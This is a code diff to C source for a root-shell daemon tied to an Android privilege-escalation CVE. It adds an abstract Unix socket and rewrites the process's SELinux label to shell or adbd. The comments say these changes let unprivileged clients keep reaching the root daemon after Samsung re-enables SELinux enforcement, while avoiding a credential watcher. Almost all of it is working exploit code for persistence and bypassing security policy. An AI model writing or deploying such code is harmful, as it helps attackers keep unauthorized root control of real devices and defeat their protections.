@@ -5,6 +5,7 @@
 #include <grp.h>
 #include <poll.h>
 #include <signal.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -19,6 +20,8 @@
 #include <unistd.h>
 
 #define SOCK_PATH "/data/local/tmp/temp_su.sock"
+
+static void relax_daemon_context(void);
 
 static void set_root_env(void) {
   setenv("PATH",
@@ -62,6 +65,22 @@ static int read_full(int fd, void *buf, size_t len) {
   return 1;
 }
 
+/* Abstract socket: no filesystem node, so no sock_file label for MAC to
+ * deny.  Combined with relax_daemon_context() (shell-labeled creator),
+ * shell clients can connect under Enforcing (same-domain unix_stream). */
+#define SOCK_ABSTRACT_NAME "cve-2026-43499-root"
+
+static socklen_t abstract_sockaddr(struct sockaddr_un *sun) {
+  memset(sun, 0, sizeof(*sun));
+  sun->sun_family = AF_UNIX;
+  sun->sun_path[0] = '\0';
+  size_t n = strlen(SOCK_ABSTRACT_NAME);
+  if (n > sizeof(sun->sun_path) - 2)
+    n = sizeof(sun->sun_path) - 2;
+  memcpy(sun->sun_path + 1, SOCK_ABSTRACT_NAME, n);
+  return (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + n);
+}
+
 static int connect_daemon(void) {
   int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
   if (fd < 0) {
@@ -70,6 +89,11 @@ static int connect_daemon(void) {
   }
 
   struct sockaddr_un sun;
+  socklen_t slen = abstract_sockaddr(&sun);
+  if (connect(fd, (struct sockaddr *)&sun, slen) == 0) {
+    return fd;
+  }
+
   memset(&sun, 0, sizeof(sun));
   sun.sun_family = AF_UNIX;
   snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", SOCK_PATH);
@@ -277,9 +301,43 @@ static void serve_one(int conn) {
   }
 }
 
+static void relax_daemon_context(void) {
+  /* Samsung re-arms SELinux within minutes and shell clients can no longer
+   * connect to a kernel-labeled socket.  Switching the daemon to a shell
+   * label BEFORE bind() makes the socket connectable under Enforcing while
+   * uid/caps stay root.  Real UID/GID transitions from this context are
+   * fatal (credential watcher), but setcon only changes the MAC label.
+   * Best-effort: failure falls back to the old behavior. */
+  static const char *cands[] = {"u:r:shell:s0", "u:r:adbd:s0", NULL};
+  char cur[96];
+  int fd = open("/proc/self/attr/current", O_RDWR | O_CLOEXEC);
+  if (fd < 0)
+    return;
+  for (int i = 0; cands[i]; i++) {
+    size_t len = strlen(cands[i]);
+    if (write(fd, cands[i], len) != (ssize_t)len)
+      continue;
+    if (lseek(fd, 0, SEEK_SET) < 0)
+      break;
+    ssize_t n = read(fd, cur, sizeof(cur) - 1);
+    if (n > 0) {
+      cur[n] = 0;
+      int log = open("/data/local/tmp/daemon-ctx.log",
+                     O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
+      if (log >= 0) {
+        dprintf(log, "daemon context: %s\n", cur);
+        close(log);
+      }
+    }
+    break;
+  }
+  close(fd);
+}
+
 static int daemon_main(void) {
   signal(SIGPIPE, SIG_IGN);
   set_root_env();
+  relax_daemon_context();
 
   int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
   if (fd < 0) {
@@ -303,15 +361,54 @@ static int daemon_main(void) {
     return 1;
   }
 
-  for (;;) {
-    int conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
-    if (conn < 0 && errno == EINTR) {
-      continue;
+  /* Abstract listener: same accept loop serves both.  -1 if unavailable. */
+  int afd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (afd >= 0) {
+    struct sockaddr_un asun;
+    socklen_t aslen = abstract_sockaddr(&asun);
+    if (bind(afd, (struct sockaddr *)&asun, aslen) != 0 || listen(afd, 16) != 0) {
+      close(afd);
+      afd = -1;
     }
-    if (conn < 0) {
-      perror("accept");
-      sleep(1);
-      continue;
+  }
+
+  for (;;) {
+    int conn = -1;
+    if (afd < 0) {
+      conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
+      if (conn < 0 && errno == EINTR) {
+        continue;
+      }
+      if (conn < 0) {
+        perror("accept");
+        sleep(1);
+        continue;
+      }
+    } else {
+      struct pollfd pfds[2];
+      pfds[0].fd = fd;
+      pfds[0].events = POLLIN;
+      pfds[1].fd = afd;
+      pfds[1].events = POLLIN;
+      int pr = poll(pfds, 2, -1);
+      if (pr < 0 && errno == EINTR) {
+        continue;
+      }
+      if (pr < 0) {
+        perror("poll");
+        sleep(1);
+        continue;
+      }
+      int lfd = (pfds[0].revents & POLLIN) ? fd : afd;
+      conn = accept4(lfd, NULL, NULL, SOCK_CLOEXEC);
+      if (conn < 0 && errno == EINTR) {
+        continue;
+      }
+      if (conn < 0) {
+        perror("accept");
+        sleep(1);
+        continue;
+      }
     }
 
     pid_t pid = fork();
